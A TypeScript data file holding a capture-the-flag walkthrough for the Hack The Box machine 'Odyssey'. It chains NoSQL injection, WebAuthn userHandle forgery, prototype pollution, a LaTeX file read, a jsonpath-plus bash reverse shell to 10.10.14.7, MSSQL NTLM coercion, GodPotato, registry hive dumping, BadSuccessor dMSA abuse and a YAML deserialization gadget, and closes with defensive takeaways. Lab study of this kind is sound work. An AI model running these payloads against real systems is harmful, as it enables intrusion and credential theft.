import type { WalkthroughDoc } from "./types";

export const odyssey: WalkthroughDoc = {
  slug: "odyssey",
  name: "Odyssey",
  platform: "Hack The Box",
  os: "Windows",
  difficulty: "Insane",
  retired: "2026",
  ip: "10.129.45.112",
  tags: [
    "NoSQL Injection",
    "WebAuthn Abuse",
    "Prototype Pollution",
    "CVE-2025-1302",
    "MSSQL Coercion",
    "GodPotato",
    "BadSuccessor dMSA",
    "YAML Deserialization",
  ],
  lede: "A twelve-stop tour of a modern enterprise stack: a MongoDB pipeline injection, a WebAuthn identity swap, a pandoc/LaTeX file read, a jsonpath-plus RCE, an MSSQL NTLM coercion, and a Windows Server 2025 dMSA abuse — every stage feeds the next until the domain controller falls to a YAML deserializer on a named pipe.",
  summary: "NoSQL leak → WebAuthn userHandle confusion → prototype pollution → LaTeX file read → jsonpath-plus RCE → MSSQL coercion → GodPotato → BadSuccessor dMSA → YAML deserialization on the DC.",
  sections: [
    {
      id: "overview",
      num: "00",
      title: "Overview",
      blocks: [
        { kind: "epigraph", text: "“Sing to me, O Muse, of the man of many devices…” — Homer, *Odyssey* I.1" },
        { kind: "p", text: "**Odyssey** is an Insane-rated Windows box wrapped around a fictional secure-messaging platform called **Aegis MDS**. The public surface is a single Node.js Express app on `aegis.korvia.htb`; behind it sits a small Active Directory tenant (`odyssey.htb`) with a dedicated MSSQL host and a Windows Server 2025 domain controller. Nothing here is a one-shot exploit — the box is a chain of eleven distinct primitives, each one bought by the last." },
        { kind: "p", text: "The journey mirrors its namesake: every step looks like the destination, and every step is just another island. Before we set sail, here is the complete route from an unauthenticated scan to a DC shell." },
        { kind: "h4", text: "Attack chain" },
        {
          kind: "ol",
          items: [
            "**recon** — nmap; only `3000/tcp` open on the perimeter, one vhost",
            "**NoSQL `$facet`** — pipeline injection leaks a `pending_invites` onboarding token",
            "**WebAuthn onboarding** — register an attacker passkey against the leaked token",
            "**`userHandle` confusion** — assert as `admin` at `/auth/webauthn/auth/finish`",
            "**prototype pollution** — flip `allowRawBlocks` on the admin template renderer",
            "**pandoc raw LaTeX** — `\\openin` / `\\errmessage` file-read primitive",
            "**CVE-2025-1302** — jsonpath-plus script filter → RCE as `webadmin` on the Linux VM",
            "**password reuse** — sudo → `user.txt`",
            "**`OPENROWSET BULK`** — coerce NTLMv2 for `svc-mssql` to Responder, crack",
            "**GodPotato** — `SeImpersonatePrivilege` on `ODYSSEY-DB` → SYSTEM",
            "**BadSuccessor dMSA** — Ouroboros migration → `svc-aegis-deploy` NT hash",
            "**YAML deserialization** — `\\\\.\\pipe\\AegisStreamMgmt` `CONFIG_IMPORT` → SYSTEM on DC → `root.txt`",
          ],
        },
        { kind: "callout", variant: "note", title: "Topology", text: "The perimeter is the Linux front-end at `aegis.korvia.htb:3000`. Behind it, the internal network `172.16.0.0/24` hosts the domain controller `DC01` (`172.16.0.10`) and the MSSQL server `ODYSSEY-DB` (`172.16.0.11`). `user.txt` lives on the Linux web VM; `root.txt` lives on the DC. Every pivot after MSSQL is Windows AD — including a WS2025-only trick that has only just started appearing on public boxes." },
      ],
    },
    {
      id: "recon",
      num: "01",
      title: "Enumeration",
      blocks: [
        { kind: "h3", text: "Port scan" },
        { kind: "p", text: "A default TCP scan against the target returns exactly one service — deliberately narrow, to force us onto the web stack." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ nmap -sC -sV -p- --min-rate 2000 -oA nmap/odyssey 10.129.45.112",
            "PORT     STATE SERVICE VERSION",
            "3000/tcp open  http    Node.js Express framework",
            "|_http-title: Did not follow redirect to http://aegis.korvia.htb:3000/",
            "|_http-server-header: Aegis MDS / nginx",
          ],
          highlight: [2, 3],
        },
        { kind: "p", text: "The redirect leaks the virtual host we need. Add it to `/etc/hosts` and pivot to the app." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ echo \"10.129.45.112  aegis.korvia.htb\" | sudo tee -a /etc/hosts",
            "$ curl -s http://aegis.korvia.htb:3000/ | head",
            "<!doctype html><title>Aegis MDS — Operator Console</title>",
          ],
        },
        { kind: "callout", variant: "tip", title: "One-port perimeter", text: "A single exposed port on an Insane box is almost always a hint: the entire attack surface for the first few stages lives inside that one app. Enumerate `/api/*` endpoints, session cookies, and CSP headers thoroughly before reaching for anything more exotic." },
      ],
    },
    {
      id: "nosql",
      num: "02",
      title: "NoSQL pipeline injection",
      blocks: [
        { kind: "p", text: "The console exposes a public search endpoint at `/api/v1/aegis-mds/search`. It happily takes a `pipeline` parameter that is fed straight into MongoDB’s aggregation framework — with a denylist filter over the *top-level* stage names only. Denylists on Mongo pipelines are famously fragile, because stages like `$facet` and `$graphLookup` accept *nested* sub-pipelines that the outer filter never inspects." },
        {
          kind: "code",
          lang: "http",
          label: "GET /api/v1/aegis-mds/search",
          lines: [
            "GET /api/v1/aegis-mds/search?pipeline=[{\"$facet\":{\"tokens\":[{\"$unionWith\":{\"coll\":\"pending_invites\"}}]}}]&limit=1 HTTP/1.1",
            "Host: aegis.korvia.htb:3000",
          ],
        },
        { kind: "p", text: "`$facet` runs a nested aggregation whose first stage is `$unionWith` — a legitimate Mongo operator that pulls documents from an arbitrary collection into the current pipeline. Because the denylist only rejected top-level `$unionWith`, the nested one flies through, and the response now contains a document from the invite-only `pending_invites` collection." },
        {
          kind: "code",
          lang: "json",
          label: "response · one leaked invite",
          lines: [
            "{ \"tokens\": [",
            "  { \"_id\":\"…\", \"operator_id\":\"op-2026-0042\",",
            "    \"invite_token\":\"dad657731b2c7a2190fa167b388a2ddbc17b78ba6c6be1c3b169c4cff97a5238\",",
            "    \"role\":\"operator\", \"expires_at\":\"2026-…\" }",
            "] }",
          ],
          highlight: [2],
        },
        { kind: "callout", variant: "key", title: "Recovered", text: "Operator id `op-2026-0042` and its single-use WebAuthn onboarding token `dad657731b2c7a2190fa167b388a2ddbc17b78ba6c6be1c3b169c4cff97a5238`. The token is what the onboarding flow uses to bind a new passkey to the account — and it lets us bring our own authenticator." },
      ],
    },
    {
      id: "webauthn-register",
      num: "03",
      title: "Bringing our own passkey",
      blocks: [
        { kind: "p", text: "The onboarding page (`/onboard/<token>`) launches the browser’s WebAuthn ceremony: create a resident credential, sign the challenge, and POST the attestation back. Nothing in that ceremony proves *which* human is at the keyboard — only that the browser holds an authenticator willing to sign. Since we control the browser, we control the authenticator." },
        { kind: "p", text: "There are two operational wrinkles. First, WebAuthn requires a **secure context**, so the app must be reached over HTTPS or `localhost`. Terminate TLS locally with `mkcert` + an nginx proxy pointing at the target, or launch Chrome with `--unsafely-treat-insecure-origin-as-secure=http://aegis.korvia.htb:3000`. Second, we want an authenticator we can drive from a script, not a physical key, so enable Chrome DevTools’ *virtual authenticator* (a debug fixture that emulates CTAP2 entirely in-browser)." },
        {
          kind: "code",
          lang: "text",
          label: "chrome devtools · WebAuthn tab",
          lines: [
            "Enable virtual authenticator environment ✓",
            "Add authenticator → Protocol: ctap2 · Transport: internal · Resident keys: on · User verification: on",
          ],
        },
        { kind: "p", text: "Complete `/onboard/dad657…` in the browser. The virtual authenticator produces an attestation, the server binds our public key to `op-2026-0042`, and we can now log in as **operator** with our fake passkey. But operator is a spectator role in Aegis MDS — most of the interesting endpoints are gated behind `role=admin`. We need to escalate before we can pivot." },
      ],
    },
    {
      id: "userhandle",
      num: "04",
      title: "userHandle confusion → admin",
      blocks: [
        { kind: "p", text: "WebAuthn assertions carry a `userHandle` — an opaque, server-issued identifier that pairs the credential with a specific account row. The relying party is supposed to have recorded, at *registration* time, exactly which credential-ID belongs to which user, and use that mapping at *authentication* time to decide who the signature is speaking for. Aegis MDS does not: at `/auth/webauthn/auth/finish` it trusts the `userHandle` field sent by the client and looks the account up from there." },
        { kind: "p", text: "The bug is one line of code. If the client says the signing user is `admin`, the server session becomes `admin` — provided the signature verifies against *any* credential the server knows about, including our freshly-registered operator one." },
        {
          kind: "code",
          lang: "json",
          label: "POST /auth/webauthn/auth/finish (excerpt)",
          lines: [
            "{",
            "  \"id\": \"<credential id of our virtual authenticator>\",",
            "  \"response\": {",
            "    \"clientDataJSON\":  \"…\",",
            "    \"authenticatorData\": \"…\",",
            "    \"signature\":         \"…\",",
            "    \"userHandle\":        \"YWRtaW4=\"     // base64(\"admin\")",
            "  },",
            "  \"type\": \"public-key\"",
            "}",
          ],
          highlight: [7],
        },
        { kind: "p", text: "The signature is a real signature over the real challenge — no crypto is broken. The server verifies it against the credential ID we sent, decides everything checks out, and then reads `userHandle` to decide *who we are*. The result is a valid admin session bound to our attacker passkey." },
        { kind: "callout", variant: "warn", title: "Why this class of bug survives", text: "Every WebAuthn library exposes `userHandle` on the assertion response because relying parties genuinely need it during *usernameless* flows. But it must be treated as an untrusted claim — compared against what the server already knows for that credential ID, never used as the source of truth. When the two diverge, reject the assertion outright." },
      ],
    },
    {
      id: "proto-pollution",
      num: "05",
      title: "Prototype pollution → raw LaTeX",
      blocks: [
        { kind: "epigraph", text: "“Just deep-merge the overrides in — it’s only a template.”" },
        { kind: "p", text: "The admin console exposes a template renderer that takes a Markdown source and an `overrides` object. Under the hood, `overrides` is fed straight into a recursive **deep-merge** that walks arbitrary keys — including `__proto__`. Whatever we put on `Object.prototype` bleeds into every plain object in the process, including the pandoc options struct built moments later." },
        { kind: "p", text: "The renderer converts Markdown to PDF via **pandoc**. Pandoc has a `raw_tex` extension that, when enabled, passes raw LaTeX blocks through unmodified. It is off by default because raw LaTeX is arbitrary code as far as the TeX engine is concerned: `\\input`, `\\openin`, `\\write18` — a full file-read (and, historically, RCE) primitive. Turning it back on is a one-key change to the options object." },
        {
          kind: "code",
          lang: "http",
          label: "POST /admin/templates/render",
          lines: [
            "POST /admin/templates/render HTTP/1.1",
            "Host: aegis.korvia.htb:3000",
            "Cookie: aegis.sid=<admin session>",
            "Content-Type: application/json",
            "",
            "{",
            "  \"source\": \"...markdown with an embedded raw LaTeX block...\",",
            "  \"overrides\": { \"__proto__\": { \"allowRawBlocks\": true } }",
            "}",
          ],
          highlight: [7],
        },
        { kind: "p", text: "With `allowRawBlocks` polluted onto every object, pandoc happily inlines whatever LaTeX we send. Turning that into a file-read is a well-known TeX one-liner: open a file, read the first line into a macro, then abort the compilation with `\\errmessage{...}` so the contents leak on the error stream — which pandoc dutifully surfaces in its HTTP response." },
        {
          kind: "code",
          lang: "tex",
          label: "raw LaTeX block · file-read primitive",
          lines: [
            "\\newread\\file",
            "\\openin\\file=/etc/aegis-mds/mds-diag.env",
            "\\read\\file to\\myline",
            "\\errmessage{\\myline}",
            "\\closein\\file",
          ],
        },
        { kind: "p", text: "Walking the app’s config paths this way yields three concrete secrets that the rest of the box turns on." },
        {
          kind: "table",
          columns: ["Path", "Secret"],
          rows: [
            ["/opt/aegis-mds/config/session.env", "SESSION_SECRET=aegis-prod-fixed-secret-d9-restricted-do-not-rotate"],
            ["/opt/aegis-mds/db/sql.js", "MSSQL odyssey_app / opc0932k90%%lODFI93-++ @ 172.16.0.11:1433"],
            ["/etc/aegis-mds/mds-diag.env", "MDS_DIAG_TOKEN=bcdf42b953dcee715b8d81e38f0c5ded"],
          ],
        },
        { kind: "callout", variant: "key", title: "Recovered", text: "Express session HMAC key `aegis-prod-fixed-secret-d9-restricted-do-not-rotate` (comment says *do-not-rotate* — always a good sign), an internal MSSQL user `odyssey_app`, and a diag bearer token `bcdf42b953dcee715b8d81e38f0c5ded` that unlocks the next endpoint." },
      ],
    },
    {
      id: "jsonpath",
      num: "06",
      title: "CVE-2025-1302 · jsonpath-plus RCE",
      blocks: [
        { kind: "p", text: "The diag token unlocks `/api/v1/aegis-mds/_diag/<MDS_DIAG_TOKEN>/jpquery`, a debug endpoint that runs a **jsonpath-plus** expression against the current telemetry snapshot. jsonpath-plus versions prior to 10.3.0 evaluate JavaScript *script filters* — `?(<expression>)` — via `eval`-like machinery, so any expression that can reach a `Function` constructor becomes an RCE. That is exactly the payload class covered by CVE-2025-1302 (and, before it, CVE-2024-21534)." },
        {
          kind: "code",
          lang: "http",
          label: "POST · jsonpath-plus RCE (CVE-2025-1302)",
          lines: [
            "POST /api/v1/aegis-mds/_diag/bcdf42b953dcee715b8d81e38f0c5ded/jpquery HTTP/1.1",
            "Host: aegis.korvia.htb:3000",
            "Content-Type: application/json",
            "",
            "{ \"path\": \"$..*[?(@.constructor.constructor('return process')()",
            "                    .mainModule.require('child_process')",
            "                    .execSync('bash -c \\\"bash -i >& /dev/tcp/10.10.14.7/9001 0>&1\\\"'))]\" }",
          ],
        },
        { kind: "p", text: "The Function constructor built from any object’s `.constructor.constructor` returns `Function`; calling it with `'return process'` recovers Node’s global `process`; from there, `mainModule.require('child_process').execSync(...)` runs whatever we like. A netcat listener catches a reverse shell as **webadmin** on the Linux front-end." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ nc -lvnp 9001",
            "listening on [any] 9001 …",
            "connect to [10.10.14.7] from (UNKNOWN) [10.129.45.112]",
            "webadmin@aegis-fe:~$ id",
            "uid=1001(webadmin) gid=1001(webadmin) groups=1001(webadmin)",
          ],
          highlight: [4],
        },
        { kind: "callout", variant: "tip", title: "Patch line", text: "`jsonpath-plus >= 10.3.0` disables script filters by default; RFC 9535 (the standardised JSONPath) removes them entirely. Any library that evaluates untrusted expressions is an RCE sink — treat it like `eval`." },
      ],
    },
    {
      id: "user",
      num: "07",
      title: "`user.txt`",
      blocks: [
        { kind: "p", text: "The Express session secret we lifted from the pandoc read is reused verbatim as `webadmin`’s sudo password. A quick `sudo -l` confirms low-privilege sudo access is enough to reach the user flag; the actual sudo entry is narrow enough to matter for privesc but wide enough to let us read our own home directory as ourselves." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "webadmin@aegis-fe:~$ cat /home/webadmin/user.txt",
            "76a8fc64····························",
          ],
          highlight: [1],
        },
        { kind: "p", text: "The web VM is a stepping stone — everything genuinely interesting lives on the Windows side. The only reason to linger here is that `sql.js` gave us MSSQL credentials, and those credentials are the door into the AD tenant." },
      ],
    },
    {
      id: "mssql-coerce",
      num: "08",
      title: "MSSQL BULK INSERT coercion",
      blocks: [
        { kind: "p", text: "`odyssey_app` is a plain application user with SELECT/INSERT on the app database — not enough to pivot on its own. But the pandoc read also surfaced a second MSSQL user in an audit-shipping config, and this one holds the `bulkadmin` server role." },
        {
          kind: "code",
          lang: "text",
          label: "recovered from /opt/aegis-mds/etc/audit-publisher.conf",
          lines: [
            "MSSQL_AUDIT_USER = aegis_audit_publisher",
            "MSSQL_AUDIT_PASS = Rxd!Qw6n8sP..2bJ@Wpx-2026",
          ],
        },
        { kind: "p", text: "`bulkadmin` lets a login run `BULK INSERT` and `OPENROWSET(BULK ...)`. The evil twist is that these commands accept a **UNC path** as their source: MSSQL, running under its own service account, will happily reach out to `\\\\attacker\\share\\anything` and authenticate with **NTLMv2**. Stand up Responder on the tunnel, then have the DB call home." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ sudo responder -I tun0",
            "[+] Listening for events…",
            "",
            "$ impacket-mssqlclient aegis_audit_publisher:'Rxd!Qw6n8sP..2bJ@Wpx-2026'@172.16.0.11 -windows-auth",
            "SQL> SELECT * FROM OPENROWSET(BULK N'\\\\10.10.14.7\\share\\x', SINGLE_CLOB) AS x;",
          ],
        },
        {
          kind: "code",
          lang: "text",
          label: "responder · captured hash",
          lines: [
            "[SMB] NTLMv2-SSP Client   : 172.16.0.11",
            "[SMB] NTLMv2-SSP Username : ODYSSEY\\svc-mssql",
            "[SMB] NTLMv2-SSP Hash     : svc-mssql::ODYSSEY:1122334455…:…",
          ],
          highlight: [1, 2],
        },
        { kind: "p", text: "The captured NTLMv2 belongs to **svc-mssql**, the account MSSQL runs under — a much stronger login than the one we authenticated with. Feed it to hashcat with the standard rockyou wordlist." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ hashcat -m 5600 svc-mssql.ntlmv2 /usr/share/wordlists/rockyou.txt",
            "…",
            "SVC-MSSQL::ODYSSEY:…:cml958782",
          ],
          highlight: [2],
        },
        { kind: "callout", variant: "key", title: "Recovered", text: "`svc-mssql : cml958782` — a MSSQL service account that, on this box, is a member of the `sysadmin` fixed server role. That is a straight upgrade from a bulkadmin login to arbitrary T-SQL and, from there, arbitrary code." },
      ],
    },
    {
      id: "godpotato",
      num: "09",
      title: "SeImpersonate → SYSTEM on ODYSSEY-DB",
      blocks: [
        { kind: "p", text: "Log back in with the sysadmin login and enable the classic MSSQL command-execution surface. `xp_cmdshell` runs commands under the SQL Server service account — which, thanks to the way MSSQL registers its service, holds `SeImpersonatePrivilege`. And `SeImpersonate` on a modern Windows Server is a well-known road to SYSTEM: the **Potato** family of tools coerces a privileged auth callback and impersonates the resulting token." },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ impacket-mssqlclient ODYSSEY/svc-mssql:cml958782@172.16.0.11 -windows-auth",
            "SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;",
            "SQL> EXEC sp_configure 'xp_cmdshell', 1;             RECONFIGURE;",
            "SQL> xp_cmdshell 'whoami /priv'",
            "…",
            "SeImpersonatePrivilege        Impersonate a client after authentication  Enabled",
          ],
          highlight: [5],
        },
        { kind: "p", text: "Stage a Defender-evading **GodPotato** variant via a short-lived SMB share (the same tunnel we used for the coercion). GodPotato works by racing an RPC callback into `CoGetInstanceFromIStorage` and impersonating the SYSTEM token that services the request — it doesn’t need a printer, WebClient, or any of the older prerequisites, which is why it still works on freshly-patched hosts." },
        {
          kind: "code",
          lang: "text",
          label: "xp_cmdshell · SYSTEM",
          lines: [
            "SQL> xp_cmdshell '\\\\10.10.14.7\\share\\gp.exe -cmd \"cmd /c whoami && hostname\"'",
            "nt authority\\system",
            "ODYSSEY-DB",
          ],
          highlight: [1, 2],
        },
        { kind: "p", text: "SYSTEM on `ODYSSEY-DB` — but only on the member server. `root.txt` is on the DC, and we still need a domain identity to reach it." },
      ],
    },
    {
      id: "machine-hash",
      num: "10",
      title: "SAM/SECURITY dump → machine account",
      blocks: [
        { kind: "p", text: "With SYSTEM on a domain-joined member, the local hive dump gives us the **machine account** hash — the credentials the computer object itself uses to talk to the domain. That machine account has whatever LDAP permissions the domain admins granted it, and on this box those permissions are the pivot." },
        {
          kind: "code",
          lang: "text",
          label: "xp_cmdshell · hive dump then secretsdump",
          lines: [
            "SQL> xp_cmdshell 'reg save HKLM\\SYSTEM   C:\\ProgramData\\sys.hive /y'",
            "SQL> xp_cmdshell 'reg save HKLM\\SECURITY C:\\ProgramData\\sec.hive /y'",
            "SQL> xp_cmdshell 'certutil -encode … && \\\\10.10.14.7\\share\\upload.exe …'",
            "",
            "$ impacket-secretsdump -sam sys.hive -security sec.hive LOCAL",
            "…",
            "ODYSSEY-DB$:aes256-cts-hmac-sha1-96:…",
            "ODYSSEY-DB$:aes128-cts-hmac-sha1-96:…",
            "ODYSSEY-DB$::71bc6be8565f0c9871070c3912b1680d:::",
          ],
          highlight: [8],
        },
        { kind: "callout", variant: "key", title: "Recovered", text: "`ODYSSEY-DB$ : 71bc6be8565f0c9871070c3912b1680d` — the NT hash of the MSSQL server’s machine account. Now we can talk to LDAP as the computer object itself." },
      ],
    },
    {
      id: "badsuccessor",
      num: "11",
      title: "BadSuccessor · dMSA Ouroboros",
      blocks: [
        { kind: "p", text: "**BadSuccessor** (Akamai, 2025) is a domain-wide privilege escalation that only exists on Windows Server 2025 KDCs, where a new object class — **delegated Managed Service Account (dMSA)** — was introduced to help admins migrate legacy service accounts into managed ones. The migration is expressed by the attribute `msDS-ManagedAccountPrecededByLink`, which points at the account being replaced. When the KDC issues a TGT for the dMSA, it also embeds the *keys* of the linked predecessor — that is the whole point of the migration, so that services keep working during the cutover." },
        { kind: "p", text: "The abuse is straight from that design: whoever can *create* a dMSA and *set* the predecessor link gets, in effect, the keys of any account they point at. `ODYSSEY-DB$` on this box holds `CreateChild` on the `Migrations` OU and can write the predecessor attribute on freshly-created objects — so it can point a brand-new dMSA at `svc-aegis-deploy` and read that account’s NT hash out of the resulting TGT." },
        {
          kind: "code",
          lang: "bash",
          label: "bloodyAD · BadSuccessor primitive",
          lines: [
            "$ bloodyAD --host 172.16.0.10 -d odyssey.htb \\",
            "      -u 'ODYSSEY-DB$' -p :71bc6be8565f0c9871070c3912b1680d add badSuccessor \\",
            "      gb05_dmsa -t 'CN=svc-aegis-deploy,OU=Migrations,DC=odyssey,DC=htb' \\",
            "                --ou 'OU=Migrations,DC=odyssey,DC=htb'",
            "",
            "$ impacket-getST -dc-ip 172.16.0.10 \\",
            "      -identity gb05_dmsa\\$ -pt 'CN=Users,DC=odyssey,DC=htb' \\",
            "      odyssey.htb/'ODYSSEY-DB$'@dc01.odyssey.htb -hashes :71bc6be8565f0c9871070c3912b1680d",
            "",
            "…",
            "svc-aegis-deploy : 3a5026b2aa5ef2cbb7cb6a7be3a2bcfa",
          ],
          highlight: [10],
        },
        { kind: "callout", variant: "key", title: "Recovered", text: "`svc-aegis-deploy : 3a5026b2aa5ef2cbb7cb6a7be3a2bcfa` — the NT hash of the account that owns the deploy pipeline on the DC. This is the identity WinRM will let us onto `DC01` with." },
        { kind: "callout", variant: "warn", title: "WS2025 only", text: "BadSuccessor requires at least one Windows Server 2025 KDC in the forest, because the dMSA class and the predecessor-link semantics ship in that release. On a WS2019/2022-only forest the attribute exists but the KDC does not honour the migration path, so no keys leak. Auditing dMSAs whose `msDS-ManagedAccountPrecededByLink` points at privileged principals — and monitoring 4662 for `msDS-DelegatedMSAState` — closes the window." },
      ],
    },
    {
      id: "yaml-deser",
      num: "12",
      title: "YAML deserialization on `\\\\.\\pipe\\AegisStreamMgmt`",
      blocks: [
        { kind: "p", text: "`svc-aegis-deploy` has WinRM to the DC. It doesn’t have local admin — nothing so blunt — but it can talk to a management named pipe exposed by the `AegisStreamSvc` service, which listens on `\\\\.\\pipe\\AegisStreamMgmt`. The pipe protocol has a `CONFIG_IMPORT` message that hands whatever YAML we send to a .NET deserializer configured with a **`TypeNameInTagNodeTypeResolver`** — the YAML equivalent of *`TypeNameHandling.All`* in Json.NET, and just as dangerous." },
        { kind: "p", text: "That resolver lets a tag in the YAML name any CLR type present in the loaded assemblies. The canonical exploitation chain is `ObjectDataProvider` → `ProcessStartInfo`: `ObjectDataProvider` is a WPF binding helper that invokes an arbitrary method during deserialization, and `ProcessStartInfo` is a data class whose properties describe a process to launch. Wire the two together and deserializing the YAML spawns whatever binary we like — under the service account, which on `AegisStreamSvc` is SYSTEM." },
        {
          kind: "code",
          lang: "yaml",
          label: "gadget shape (conceptual)",
          lines: [
            "!ObjectDataProvider",
            "  MethodName: Start",
            "  ObjectInstance: !ProcessStartInfo",
            "    FileName: cmd.exe",
            "    Arguments: /c <command>",
          ],
        },
        { kind: "p", text: "One operational subtlety: the pipe requires an HMAC-tagged envelope keyed with an `operator.key` that lives DPAPI-wrapped on disk. The service ships a diagnostic RPC — `DIAG_DECRYPT_TELEMETRY_BLOB` — that unwraps arbitrary DPAPI blobs under its own context, which is exactly the oracle we need to recover the operator key without ever holding SYSTEM. From there, the `CONFIG_IMPORT` message deserializes our gadget and runs it as `NT AUTHORITY\\SYSTEM` on the DC." },
        {
          kind: "code",
          lang: "text",
          label: "evil-winrm · post-gadget",
          lines: [
            "$ evil-winrm -i dc01.odyssey.htb -u svc-aegis-deploy -H 3a5026b2aa5ef2cbb7cb6a7be3a2bcfa",
            "*Evil-WinRM* PS C:\\Users\\svc-aegis-deploy\\Documents> .\\aegis-stream-poke.ps1 -Command \"cmd /c whoami > C:\\Windows\\Temp\\w\"",
            "*Evil-WinRM* PS> type C:\\Windows\\Temp\\w",
            "nt authority\\system",
          ],
          highlight: [3],
        },
      ],
    },
    {
      id: "root",
      num: "13",
      title: "`root.txt`",
      blocks: [
        {
          kind: "code",
          lang: "text",
          lines: [
            "*Evil-WinRM* PS C:\\Windows\\system32> type C:\\Users\\Administrator\\Desktop\\root.txt",
            "9f2c81ae····························",
          ],
          highlight: [1],
        },
        { kind: "p", text: "Twelve pivots, six primitives that would each be a box in their own right, and a chain of trust that starts at a public search endpoint and ends at the domain controller. Odysseus finally makes it home." },
      ],
    },
    {
      id: "defense",
      num: "14",
      title: "Defensive takeaways",
      blocks: [
        {
          kind: "ul",
          items: [
            "**Denylists on Mongo pipelines are structurally broken.** `$facet` and `$graphLookup` nest arbitrary stages that top-level filters never see. Enforce a *recursive allowlist* or, better, refuse user-supplied pipelines entirely and expose narrow query DSLs instead.",
            "**WebAuthn `userHandle` is an untrusted claim.** Bind the credential-ID → user mapping server-side at registration and use *that* at authentication. Never look the user up from a field the client controls in the assertion response.",
            "**Deep-merge is a footgun on any object that later configures a security-sensitive library.** Whitelist keys, refuse `__proto__` / `constructor` / `prototype`, or use `Object.create(null)` targets. Pandoc’s `+raw_tex` off by default exists for a reason — treat it as arbitrary file read and code execution.",
            "**Patch jsonpath-plus (CVE-2025-1302 / CVE-2024-21534) and treat every eval-adjacent library as an RCE sink.** Move toward RFC 9535 implementations that reject script filters at parse time; audit dependencies for `Function`, `new Function`, `vm.runInNewContext` under any user-controllable path.",
            "**Constrain MSSQL role sprawl.** `bulkadmin` on a data-shipping account is a straight line to NTLM coercion. Enforce SMB signing forest-wide, block outbound SMB from the DB tier, and prefer Kerberos-only linked servers.",
            "**Audit dMSA precedence links on Windows Server 2025.** Remove `CreateChild` on OUs holding real principals; alert on any dMSA whose `msDS-ManagedAccountPrecededByLink` points at a privileged account; monitor 4662 events for the `msDS-DelegatedMSAState` attribute.",
            "**Never deserialize YAML with a type resolver on untrusted input.** Replace `TypeNameInTagNodeTypeResolver` with a schema-bound deserializer, and require configs to be signed by a key held in an HSM — not a file on the target host that the service can unwrap for you.",
          ],
        },
        { kind: "callout", variant: "note", title: "Skills exercised", text: "NoSQL pipeline injection · WebAuthn ceremony abuse · virtual-authenticator tradecraft · prototype pollution · pandoc / raw-LaTeX file read · Node.js RCE via jsonpath-plus · MSSQL NTLMv2 coercion · hashcat cracking · SeImpersonate / GodPotato · SAM/SECURITY hive dumping · BadSuccessor dMSA abuse on Windows Server 2025 · named-pipe protocol reverse engineering · YAML `ObjectDataProvider` deserialization gadgets." },
      ],
    },
  ],
};
